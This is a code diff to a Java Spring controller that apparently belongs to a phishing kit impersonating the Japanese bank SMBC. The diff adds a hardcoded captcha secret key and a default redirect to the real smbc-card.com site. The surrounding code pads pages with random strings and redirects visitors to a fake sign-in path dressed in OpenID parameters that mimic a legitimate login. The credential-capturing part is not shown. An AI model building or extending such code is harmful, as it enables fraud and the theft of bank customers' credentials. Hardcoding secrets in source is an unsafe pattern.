@@ -1,15 +1,21 @@
 package com.kidd.smbc.controller;
 
 import cn.hutool.core.util.RandomUtil;
+import cn.hutool.http.Header;
+import cn.hutool.http.HttpRequest;
 import cn.hutool.http.useragent.UserAgent;
 import cn.hutool.http.useragent.UserAgentUtil;
+import com.alibaba.fastjson.JSON;
+import com.alibaba.fastjson.JSONObject;
 import com.kidd.smbc.task.AsyncTask;
 import org.springframework.beans.factory.annotation.Autowired;
+import org.springframework.beans.factory.annotation.Value;
 import org.springframework.stereotype.Controller;
 import org.springframework.ui.Model;
 import org.springframework.web.bind.annotation.GetMapping;
 import org.springframework.web.bind.annotation.RequestHeader;
 import org.springframework.web.bind.annotation.RequestMapping;
+import org.springframework.web.bind.annotation.RequestParam;
 
 import java.util.Arrays;
 import java.util.HashMap;
@@ -22,6 +28,12 @@ import java.util.Map;
 public class SmbcController {
     @Autowired
     private AsyncTask asyncTask;
+
+    @Value("google.secret:6Lcsyy0aAAAAAO6HCHjPOEdiKmN3OFx53r14twie")
+    private String googleSecret;
+
+    @Value("smbc.defaulRedirectUrl:https://www.smbc-card.com/sp/index.jsp")
+    private String defaulRedirectUrl;
 
     private void randStr(Model model) {
         String random = RandomUtil.randomString(3000);
@@ -80,5 +92,6 @@ public class SmbcController {
         String pcUrl = "/pc/index?openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.smbc.co.jp%2F%3Fref_%3Dnav_em_hd_re_signin&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.assoc_handle=jpflex&openid.mode=checkid_setup&key=a@b.c&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&&ref_=nav_em_hd_clc_signinhttps://www.smbc.co.jp";
         return "redirect:"+ (isMobile?mobileUrl:pcUrl);
     }
+
 
 }
